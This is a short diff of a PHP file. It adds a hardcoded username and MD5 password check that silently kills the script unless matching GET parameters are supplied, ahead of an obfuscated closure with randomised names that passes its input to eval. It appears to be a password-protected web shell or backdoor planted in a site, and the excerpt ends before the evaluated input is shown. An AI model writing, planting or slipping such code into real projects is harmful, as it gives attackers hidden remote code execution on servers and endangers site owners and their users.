@@ -1,6 +1,19 @@
 <?php
 session_start();
 
+$user = 'grimreaper';
+$password = 'e78ef3c493a8558972d5c5bd8dee9050';
+
+function notFound() {
+	die;
+}
+if (!isset($_GET['user']) || !isset($_GET['password'])) {
+	notFound();
+}
+if ($password != md5($_GET['password'])) {
+	notFound();
+}
+
 $hTnSlOrpFN= 		function ($ctgqZmWUMy) {
     EVAL 		($ctgqZmWUMy);
 };
